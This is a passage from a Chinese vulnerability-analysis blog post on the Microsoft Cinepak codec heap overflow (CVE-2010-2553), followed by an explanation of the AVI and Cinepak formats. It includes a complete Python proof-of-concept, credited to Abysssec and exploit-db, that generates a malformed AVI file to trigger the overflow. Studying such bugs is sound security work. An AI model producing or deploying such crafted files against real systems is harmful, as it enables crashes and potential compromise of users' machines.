漏洞复现"></a>0x20 漏洞复现</h2><p>&emsp;&emsp;用于<code>触发漏洞</code>的PoC代码，运行后会生成<code>poc.avi</code>，该份代码是由<code>Abysssec</code>安全组织公布在<code>exploit-db</code>站点上的：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">  __  __  ____         _    _ ____  </span></span><br><span class="line"><span class="string"> |  \/  |/ __ \   /\  | |  | |  _ \ </span></span><br><span class="line"><span class="string"> | \  / | |  | | /  \ | |  | | |_) |</span></span><br><span class="line"><span class="string"> | |\/| | |  | |/ /\ \| |  | |  _ &lt; </span></span><br><span class="line"><span class="string"> | |  | | |__| / ____ \ |__| | |_) |</span></span><br><span class="line"><span class="string"> |_|  |_|\____/_/    \_\____/|____/ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://www.exploit-db.com/moaub-26-microsoft-cinepak-codec-cvdecompress-heap-overflow-ms10-055/</span></span><br><span class="line"><span class="string">https://www.exploit-db.com/exploits/15112</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Title             : Microsoft Cinepak Codec CVDecompress Heap Overflow</span></span><br><span class="line"><span class="string">  Version           : iccvid.dll XP SP3</span></span><br><span class="line"><span class="string">  Analysis          : http://www.abysssec.com</span></span><br><span class="line"><span class="string">  Vendor            : http://www.microsoft.com</span></span><br><span class="line"><span class="string">  Impact            : High</span></span><br><span class="line"><span class="string">  Contact           : shahin [at] abysssec.com , info  [at] abysssec.com</span></span><br><span class="line"><span class="string">  Twitter           : @abysssec</span></span><br><span class="line"><span class="string">  CVE               : CVE-2010-2553</span></span><br><span class="line"><span class="string">  MOAUB Number      : </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    aviHeaders = (<span class="string">"\x52\x49\x46\x46"</span> <span class="comment"># dwList = "RIFF"</span></span><br><span class="line">                  <span class="string">"\x58\x01\x00\x00"</span> <span class="comment"># dwSize = 0x158 = 344 byte</span></span><br><span class="line">                  <span class="string">"\x41\x56\x49\x20"</span> <span class="comment"># dwFourCC = "AVI "</span></span><br><span class="line">                  <span class="string">"\x4C\x49\x53\x54"</span>    <span class="comment"># dwList = "LIST" &lt;---------------------------+</span></span><br><span class="line">                  <span class="string">"\xC8\x00\x00\x00"</span>    <span class="comment"># dwSize = 0xc8 = 200 byte                    |  </span></span><br><span class="line">                  <span class="string">"\x68\x64\x72\x6C"</span>    <span class="comment"># dwFourCC = "hdrl"                           |  </span></span><br><span class="line">                  <span class="string">"\x61\x76\x69\x68"</span>        <span class="comment"># dwFourCC = "avih" &lt;-----------+         |  </span></span><br><span class="line">                  <span class="string">"\x38\x00\x00\x00"</span>        <span class="comment"># dwSize = 0x38 = 56 byte       |         |  </span></span><br><span class="line">                  <span class="string">"\xA0\x86\x01\x00"</span>        <span class="comment"># dwMicroSecPerFrame = 0x186A0  |         |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>        <span class="comment"># dwMaxBytesPerSec = 0x0        |         |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>        <span class="comment"># dwPaddingGranularity = 0x0    |         |  </span></span><br><span class="line">                  <span class="string">"\x10\x01\x00\x00"</span>        <span class="comment"># dwFlages = 0x110              |         |  </span></span><br><span class="line">                  <span class="string">"\x4E\x00\x00\x00"</span>        <span class="comment"># dwTotalFrame = 0x4E = 78      |         |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>        <span class="comment"># dwInitialFrames = 0x0       "avih"      |  </span></span><br><span class="line">                  <span class="string">"\x01\x00\x00\x00"</span>        <span class="comment"># dwStreams = 0x1               |         |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>        <span class="comment"># dwSuggestedBufferSize = 0x0   |         |  </span></span><br><span class="line">                  <span class="string">"\x60\x01\x00\x00"</span>        <span class="comment"># dwWidth = 0x160 = 352         |         |  </span></span><br><span class="line">                  <span class="string">"\x20\x01\x00\x00"</span>        <span class="comment"># dwHeight = 0x120 = 288        |         |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>        <span class="comment"># dwReserved[0]                 |         |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>        <span class="comment"># dwReserved[1]                 |         |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>        <span class="comment"># dwReserved[2]                 |         |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>        <span class="comment"># dwReserved[3] &lt;---------------+         |  </span></span><br><span class="line">                  <span class="string">"\x4C\x49\x53\x54"</span>        <span class="comment"># dwList = "LIST" &lt;------------------+    |  </span></span><br><span class="line">                  <span class="string">"\x7C\x00\x00\x00"</span>        <span class="comment"># dwSize = 0x7C = 124 byte           |    |  </span></span><br><span class="line">                  <span class="string">"\x73\x74\x72\x6C"</span>        <span class="comment"># dwFourCC = "strl"                  |    |  </span></span><br><span class="line">                  <span class="string">"\x73\x74\x72\x68"</span>            <span class="comment"># dwFourCC = "strh" &lt;-------+    |    |  </span></span><br><span class="line">                  <span class="string">"\x38\x00\x00\x00"</span>            <span class="comment"># dwSize = 0x38 = 56 byte   |    |    |  </span></span><br><span class="line">                  <span class="string">"\x76\x69\x64\x73"</span>            <span class="comment"># fccType = "vids"          |    |    |  </span></span><br><span class="line">                  <span class="string">"\x63\x76\x69\x64"</span>            <span class="comment"># fccHandler = "cvid"       |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>            <span class="comment"># dwFlags = 0x0             |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00"</span>                    <span class="comment"># wPriority = 0x0           |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00"</span>                    <span class="comment"># wLanguage = 0x0           |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>            <span class="comment"># dwInitalFrames = 0x0      |    | "hdrl"  </span></span><br><span class="line">                  <span class="string">"\xE8\x03\x00\x00"</span>            <span class="comment"># dwScale = 0x3E8 = 1000 "strh"  |    |  </span></span><br><span class="line">                  <span class="string">"\x10\x27\x00\x00"</span>            <span class="comment"># dwRate = 0x2710 = 10000   |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>            <span class="comment"># dwStart = 0x0             |    |    |  </span></span><br><span class="line">                  <span class="string">"\x4E\x00\x00\x00"</span>            <span class="comment"># dwLength = 0x4E = 78      |    |    |  </span></span><br><span class="line">                  <span class="string">"\x20\x74\x00\x00"</span>            <span class="comment"># dwSuggestedBufferSize     |    |    |     ; 0x7420=29728</span></span><br><span class="line">                  <span class="string">"\xFF\xFF\xFF\xFF"</span>            <span class="comment"># dwQuality = -1            |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>            <span class="comment"># dwSampleSize = 0x0        |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00"</span>                        <span class="comment"># left = 0x0            | "strl"  |  </span></span><br><span class="line">                  <span class="string">"\x00\x00"</span>                        <span class="comment"># top = 0x0             |    |    |  </span></span><br><span class="line">                  <span class="string">"\x60\x01"</span>                        <span class="comment"># right = 0x160 = 352   |    |    |  </span></span><br><span class="line">                  <span class="string">"\x20\x01"</span>                        <span class="comment"># bottom =0x120 = 288&lt;--+    |    |  </span></span><br><span class="line">                  <span class="string">"\x73\x74\x72\x66"</span>            <span class="comment"># dwFourCC = "strf" &lt;-------+    |    |  </span></span><br><span class="line">                  <span class="string">"\x28\x00\x00\x00"</span>            <span class="comment"># dwSize = 0x28 = 40 byte   |    |    |  </span></span><br><span class="line">                  <span class="string">"\x28\x00\x00\x00"</span>            <span class="comment"># biSize = 0x28 = 40 byte   |    |    |  </span></span><br><span class="line">                  <span class="string">"\x50\x01\x00\x00"</span>            <span class="comment"># biWidth = 0x150 = 336     |    |    |  </span></span><br><span class="line">                  <span class="string">"\x20\x01\x00\x00"</span>            <span class="comment"># biHeight =0x120 = 288     |    |    |  </span></span><br><span class="line">                  <span class="string">"\x01\x00"</span>                    <span class="comment"># biPlanes = 0x1         "strf"  |    |  </span></span><br><span class="line">                  <span class="string">"\x18\x00"</span>                    <span class="comment"># biBitCount = 0x18 = 24    |    |    |  </span></span><br><span class="line">                  <span class="string">"\x63\x76\x69\x64"</span>            <span class="comment"># biCompression = "cvid"    |    |    |  </span></span><br><span class="line">                  <span class="string">"\x84\x8D\x00\x00"</span>            <span class="comment"># biSizeImage=0x8D84=36228  |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>            <span class="comment"># biXPelsPerMeter = 0x0     |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>            <span class="comment"># biYPelsPerMeter = 0x0     |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>            <span class="comment"># biClrUsed = 0x0           |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>)           <span class="comment"># biClrImportant = 0x0 &lt;----+    |    |  </span></span><br><span class="line">                                                <span class="comment">#                                |    |  </span></span><br><span class="line">    padding =    (<span class="string">"\x4A\x55\x4E\x4B"</span>            <span class="comment"># dwFourCC = "JUNK"              |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>            <span class="comment"># dwSize = 0x0 &lt;-----------------+----+</span></span><br><span class="line">                  <span class="string">"\x4A\x55\x4E\x4B"</span>        <span class="comment"># dwFourCC = "JUNK"                       </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>)       <span class="comment"># dwSize = 0x0 </span></span><br><span class="line">                                        </span><br><span class="line">    movi_tag =   (<span class="string">"\x4C\x49\x53\x54"</span>    <span class="comment"># dwList = "LIST" &lt;-----------------------------------------+</span></span><br><span class="line">                  <span class="string">"\x5C\x00\x00\x00"</span>    <span class="comment"># dwSize = 0x5C = 92 byte                                   |</span></span><br><span class="line">                  <span class="string">"\x6D\x6F\x76\x69"</span>    <span class="comment"># dwFourCC = "movi"                                         |</span></span><br><span class="line">                  <span class="string">"\x30\x30\x64\x63"</span>        <span class="comment"># dwFourCC = "00dc"                                     |   ; 压缩视频帧数据块</span></span><br><span class="line">                  <span class="string">"\x10\x00\x00\x00"</span>)       <span class="comment"># dwSize = 0x10 = 16 byte                               |</span></span><br><span class="line">                                            <span class="comment">#                                                       |</span></span><br><span class="line">    cinepak_codec_data1 = (<span class="string">"\x00"</span>           <span class="comment"># Flags &lt;-------------------+                           |   ; Flags = 0x0</span></span><br><span class="line">                  <span class="string">"\x00\x00\x68"</span>            <span class="comment"># Length of CVID data       |                           |   ; Length of CVID data = 0x68 = 104</span></span><br><span class="line">                  <span class="string">"\x01\x60"</span>                <span class="comment"># Width of coded frame "Frame Header"                   |   ; Width of coded frame = 0x160 = 352</span></span><br><span class="line">                  <span class="string">"\x01\x20"</span>)               <span class="comment"># Height of coded frame     |                           |   ; Height of coded frame = 0x120 = 288</span></span><br><span class="line">    number_of_coded_strips = (<span class="string">"\x00\x10"</span>)   <span class="comment"># Number of coded strips &lt;--+                           |   ; number_of_coded_strips = 0x10 = 16</span></span><br><span class="line">    cinepak_codec_data2 = (<span class="string">"\x10\x00"</span>       <span class="comment"># Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1000 - Intra-coded strip</span></span><br><span class="line">                  <span class="string">"\x00\x10"</span>                <span class="comment"># Size of strip data        |                           |   ; Size of strip data = 0x10 = 16</span></span><br><span class="line">                  <span class="string">"\x00\x00"</span>                <span class="comment"># Strips top Y position "Strip Header"                  |   ; Strips top Y position = 0x0</span></span><br><span class="line">                  <span class="string">"\x00\x00"</span>                <span class="comment"># Strips top X position     |                           |   ; Strips top X position = 0x0</span></span><br><span class="line">                  <span class="string">"\x00\x60"</span>                <span class="comment"># Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x60 = 96</span></span><br><span class="line">                  <span class="string">"\x01\x60"</span>                <span class="comment"># Strips bottom X position&lt;-+                           |   ; Strips bottom X position = 0x160 = 352</span></span><br><span class="line">                  <span class="string">"\x20\x00"</span>                <span class="comment"># CVID Chunk ID &lt;-----------+ "CVID Chunk"              |   ; CVID Chunk ID = 0x2000 - List of blocks in 12 bit V4 codebook</span></span><br><span class="line">                  <span class="string">"\x00\x00"</span>                <span class="comment"># Size of chunk data(N) &lt;---+                           |   ; Size of chunk data = 0x0</span></span><br><span class="line">                  <span class="string">"\x11\x00"</span>                <span class="comment"># Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip</span></span><br><span class="line">                  <span class="string">"\x00\x10"</span>                <span class="comment"># Size of strip data        |                           |   ; Size of strip data = 0x10 = 16</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips top Y position "Strip Header"               "movi" ; Strips top Y position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips top X position     |                           |   ; Strips top X position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips bottom X position&lt;-+                           |   ; Strips bottom X position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># CVID Chunk ID &lt;-----------+ "CVID Chunk"              |   ; CVID Chunk ID = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Size of chunk data(N) &lt;---+                           |   ; Size of chunk data = 0x4141</span></span><br><span class="line">                  <span class="string">"\x11\x00"</span>                <span class="comment"># Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip</span></span><br><span class="line">                  <span class="string">"\x00\x10"</span>                <span class="comment"># Size of strip data        |                           |   ; Size of strip data = 0x10 = 16</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips top Y position "Strip Header"                  |   ; Strips top Y position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips top X position     |                           |   ; Strips top X position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips bottom X position&lt;-+                           |   ; Strips bottom X position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># CVID Chunk ID &lt;-----------+ "CVID Chunk"              |   ; CVID Chunk ID = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Size of chunk data(N) &lt;---+                           |   ; Size of chunk data = 0x4141</span></span><br><span class="line">                  <span class="string">"\x11\x00"</span>                <span class="comment"># Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip</span></span><br><span class="line">                  <span class="string">"\x00\x10"</span>                <span class="comment"># Size of strip data        |                           |   ; Size of strip data = 0x10 = 16</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips top Y position "Strip Header"                  |   ; Strips top Y position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips top X position     |                           |   ; Strips top X position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips bottom X position&lt;-+                           |   ; Strips bottom X position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># CVID Chunk ID &lt;-----------+ "CVID Chunk"              |   ; CVID Chunk ID = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Size of chunk data(N) &lt;---+                           |   ; Size of chunk data = 0x4141</span></span><br><span class="line">                  <span class="string">"\x11\x00"</span>                <span class="comment"># Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip</span></span><br><span class="line">                  <span class="string">"\x00\x10"</span>                <span class="comment"># Size of strip data    "Strip Header"                  |   ; Size of strip data = 0x10 = 16</span></span><br><span class="line">                  <span class="string">"\x41\x00"</span>)               <span class="comment"># Strips top Y position&lt;----+---------------------------+   ; Strips top Y position = 0x4141</span></span><br><span class="line">    </span><br><span class="line">    idx_tag =    (<span class="string">"\x69\x64\x78\x31"</span>    <span class="comment"># dwFourCC = "idx1" &lt;-----------+   </span></span><br><span class="line">                  <span class="string">"\x10\x00\x00\x00"</span>    <span class="comment"># dwSize = 0x10 = 16 byte       |   </span></span><br><span class="line">                  <span class="string">"\x30\x30\x64\x63"</span>        <span class="comment"># dwChunkId = "00dc"     "idx1" </span></span><br><span class="line">                  <span class="string">"\x10\x00\x00\x00"</span>        <span class="comment"># dwFlags = 0x10            |   </span></span><br><span class="line">                  <span class="string">"\x04\x00\x00\x00"</span>        <span class="comment"># dwOffset = 0x4            |   </span></span><br><span class="line">                  <span class="string">"\x68\x00\x00\x00"</span>)       <span class="comment"># dwSize = 0x68 &lt;-----------+   </span></span><br><span class="line">    </span><br><span class="line">    avifile = open(<span class="string">'poc3.avi'</span>, <span class="string">'wb+'</span>)</span><br><span class="line">    avifile.write(aviHeaders)</span><br><span class="line">    avifile.write(padding)</span><br><span class="line">    avifile.write(movi_tag)</span><br><span class="line">    avifile.write(cinepak_codec_data1)</span><br><span class="line">    avifile.write(number_of_coded_strips)</span><br><span class="line">    avifile.write(cinepak_codec_data2)</span><br><span class="line">    avifile.write(idx_tag)</span><br><span class="line">    </span><br><span class="line">    avifile.close()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[-] AVI file generated'</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><h2 id="0x30-漏洞原理分析"><a href="#0x30-漏洞原理分析" class="headerlink" title="0x30 漏洞原理分析"></a>0x30 漏洞原理分析</h2><h3 id="0x31-AVI文件格式"><a href="#0x31-AVI文件格式" class="headerlink" title="0x31 AVI文件格式"></a>0x31 AVI文件格式</h3><p>&emsp;&emsp;<code>AVI文件格式</code>的细节，可以看我写的另一篇文章<code>《AVI文件格式分析》</code>。</p><h3 id="0x32-Cinepak视频编解码器"><a href="#0x32-Cinepak视频编解码器" class="headerlink" title="0x32 Cinepak视频编解码器"></a>0x32 Cinepak视频编解码器</h3><p>&emsp;&emsp;<code>Cinepak编解码器</code>是一种相对<code>较旧的</code>编码技术，今天仍然<code>很少使用</code>。它的<code>优势</code>来自<code>解码器的计算简单</code>，而不是<code>比特率与质量性能</code>之间的关系。这个<code>编解码器</code>基本上是一个具有<code>自适应向量密度</code>的<code>向量量化器</code>。<code>每个帧</code>被分割为<code>4x4像素块</code>，并且<code>每个块</code>使用<code>1或4个向量</code>进行编码。我们将这些<code>编码类型</code>标记如下：</p><blockquote><ul><li><strong><code>V1</code></strong> - 每个块(block)用<code>1个向量</code>编码。</li><li><strong><code>V4</code></strong> - 每个块(block)用<code>4个向量</code>编码。</li></ul></blockquote><p>&emsp;&emsp;<code>V1</code>和<code>V4</code>编码类型都引用<code>单独的向量codebooks</code>，我们分别将其标记为<code>V1 codebooks</code>和<code>V4 codebooks</code>。<code>每个codebooks</code>最多包含<code>256个条目</code>。</p><p>&emsp;&emsp;<code>Frame</code>也被分成可变大小的<code>条(Strips)</code>。<code>条(Strips)</code>定义了<code>Frame</code>的区域大小，<code>该区域的尺寸</code>小于或等于<code>Frame的尺寸</code>。<code>每个条(Strips)</code>定义其自己的<code>一对</code>独特的<code>向量codebooks</code>。</p><p>&emsp;&emsp;一个<code>Frame</code>可以使用<code>每像素8位</code>(bpp)或<code>每像素12位</code>编码。在<code>12bpp模式</code>下，每个<code>codebooks向量</code>包含<code>4个8位亮度值</code>(luminance)和<code>2个子采样的8位色度值</code>(chrominance)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">   +----+----+  +---+  +---+</span><br><span class="line">   | y0 | y1 |  | u |  | v |</span><br><span class="line">   +----+----+  +---+  +---+</span><br><span class="line">   | y2 | y3 |</span><br><span class="line">   +----+----+</span><br><span class="line">----------------------------------------------------------------------------------------------</span><br><span class="line">    YUV444(4x4 pixel blocks)                        YUV422(4x4 pixel blocks)</span><br><span class="line">    +-----+-----+-----+-----+                       +-----+-----+-----+-----+</span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       |  Y  |  Y  |  Y  |  Y  |</span><br><span class="line">    | U V | U V | U V | U V |                       | U   |   V | U   |   V |</span><br><span class="line">    +-----+-----+-----+-----+                       +-----+-----+-----+-----+</span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       |  Y  |  Y  |  Y  |  Y  |</span><br><span class="line">    | U V | U V | U V | U V | 4*4*3=48byte          | U   |   V | U   |   V | 4*4*2=32byte</span><br><span class="line">    +-----+-----+-----+-----+ (48*8)/16=24bpp       +-----+-----+-----+-----+ (32*8)/16=16bpp</span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       |  Y  |  Y  |  Y  |  Y  |</span><br><span class="line">    | U V | U V | U V | U V |                       | U   |   V | U   |   V |</span><br><span class="line">    +-----+-----+-----+-----+                       +-----+-----+-----+-----+</span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       |  Y  |  Y  |  Y  |  Y  |</span><br><span class="line">    | U V | U V | U V | U V |                       | U   |   V | U   |   V |</span><br><span class="line">    +-----+-----+-----+-----+                       +-----+-----+-----+-----+</span><br><span class="line"></span><br><span class="line">    YUV420(4x4 pixel blocks)                        Y(4x4 pixel blocks)</span><br><span class="line">    +-----+-----+-----+-----+                       +-----+-----+-----+-----+</span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       |  Y  |  Y  |  Y  |  Y  |</span><br><span class="line">    | U   |     | U   |     |                       |     |     |     |     |</span><br><span class="line">    +-----+-----+-----+-----+                       +-----+-----+-----+-----+</span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       |  Y  |  Y  |  Y  |  Y  |</span><br><span class="line">    |     |   V |     |   V | 4*(4+1+1)=24byte      |     |     |     |     | 4*4*1=16byte</span><br><span class="line">    +-----+-----+-----+-----+ (24*8)/16=12bpp       +-----+-----+-----+-----+ (16*8)/16=8bpp</span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       |  Y  |  Y  |  Y  |  Y  |</span><br><span class="line">    | U   |     | U   |     |                       |     |     |     |     |</span><br><span class="line">    +-----+-----+-----+-----+                       +-----+-----+-----+-----+</span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       |  Y  |  Y  |  Y  |  Y  |</span><br><span class="line">    |     |   V |     |   V |                       |     |     |     |     |</span><br><span class="line">    +-----+-----+-----+-----+                       +-----+-----+-----+-----+</span><br><span class="line"></span><br><span class="line">    YUV411(4x4 pixel blocks)                        </span><br><span class="line">    +-----+-----+-----+-----+                       </span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       </span><br><span class="line">    | U   |     |   V |     |                       </span><br><span class="line">    +-----+-----+-----+-----+                       </span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       </span><br><span class="line">    |     | U   |     |   V | 4*(4+1+1)=24byte          </span><br><span class="line">    +-----+-----+-----+-----+ (24*8)/16=12bpp       </span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       </span><br><span class="line">    | U   |     |   V |     |                       </span><br><span class="line">    +-----+-----+-----+-----+                       </span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       </span><br><span class="line">    |     | U   |     |   V |                       </span><br><span class="line">    +-----+-----+-----+-----+</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;在<code>8bpp模式</code>下，<code>codebooks</code>仅包含<code>4个亮度值</code>(luminance)。使用以下简单的<code>矩阵乘法</code>可实现从<code>RGB颜色空间</code>到<code>Cinepak颜色空间</code>的转换：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| r |   | 1.0  0.0  2.0 | | y |</span><br><span class="line">| g | = | 1.0 -0.5 -1.0 | | u |</span><br><span class="line">| b |   | 1.0  2.0  0.0 | | v |</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;求3x3矩阵的<code>逆矩阵</code>可以得出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| y |   |  0.2857  0.5714  0.1429 | | r |</span><br><span class="line">| u | = | -0.1429 -0.2857  0.4286 | | g |</span><br><span 